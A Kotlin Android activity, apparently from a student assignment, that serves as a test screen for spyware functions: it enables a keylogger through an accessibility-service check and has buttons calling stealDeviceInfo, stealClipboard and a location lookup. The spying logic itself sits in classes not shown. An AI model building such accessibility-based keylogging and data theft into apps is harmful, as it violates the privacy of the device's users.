package com.example.assignment1

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.LocationManager
import android.os.Bundle
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.core.app.ActivityCompat
import com.example.assignment1.DataRetriever.FindLocation
import com.example.assignment1.DataRetriever.General


class MinYaoTest : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_minyaotest)

        // Need this to allow finding of public IP
        val policy = ThreadPolicy.Builder().permitAll().build()
        StrictMode.setThreadPolicy(policy)

        // Use functions in General Class
        val gn = General(this,this)

        // Use functions in FindLocation Class
        val gps = FindLocation(this, this)

        // Enable Keylogger
        gn.accessibilityCheck()

        val inputField = findViewById<EditText>(R.id.displayResult)

        // steps to get location
        findViewById<Button>(R.id.btn_get_location).setOnClickListener {
            inputField.setText(gps.getLocationDetails(), TextView.BufferType.EDITABLE)
        }

        // steps to get device info
        findViewById<Button>(R.id.btn_get_deviceinfo).setOnClickListener {
            inputField.setText(gn.stealDeviceInfo())
        }

        //steps to get clipboard
        findViewById<Button>(R.id.btn_get_clipboard).setOnClickListener {
            inputField.setText(gn.stealClipboard())
        }
    }

//    private fun checkLocationPermission() {
//        // Ask for permission!
//        if(ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION)
//        != PackageManager.PERMISSION_GRANTED
//            && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION)
//            != PackageManager.PERMISSION_GRANTED
//        )
//        {
//            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
//            return
//        }
//    }
}